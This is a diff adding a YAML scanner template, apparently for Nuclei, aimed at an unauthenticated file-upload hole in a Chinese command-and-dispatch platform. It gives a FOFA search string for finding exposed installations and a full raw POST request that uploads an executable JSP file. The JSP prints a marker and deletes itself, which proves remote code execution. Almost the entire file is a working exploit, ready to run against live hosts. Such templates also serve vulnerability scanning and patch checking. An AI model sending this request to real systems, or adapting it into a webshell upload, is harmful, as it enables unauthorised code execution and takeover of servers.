@@ -1,0 +1,35 @@
+id: commandplatform-uploadfile
+
+info:
+  name: "可视化融合指挥调度平台 dispatch 接口未授权文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/favicon.ico#/login"
+          可视化融合指挥调度平台 uploadFile 接口未实施有效文件上传校验机制，攻击者可通过构造恶意请求上传Webshell、恶意脚本等可执行文件，从而实现服务器远程代码执行或敏感数据篡改。该缺陷可能导致系统权限被完全接管，存在严重的远程攻击风险。
+  tags: 可视化融合指挥调度平台
+
+http:
+- raw:
+  - |
+    POST /dispatch/layuiIm/uploadFile HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----HJBFIUERGBFUYERBVYUBBhbvuyvvtyckuhij
+
+    ------HJBFIUERGBFUYERBVYUBBhbvuyvvtyckuhij
+    Content-Disposition: form-data; name="file";filename="NTest.jsp"
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------HJBFIUERGBFUYERBVYUBBhbvuyvvtyckuhij--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'other'
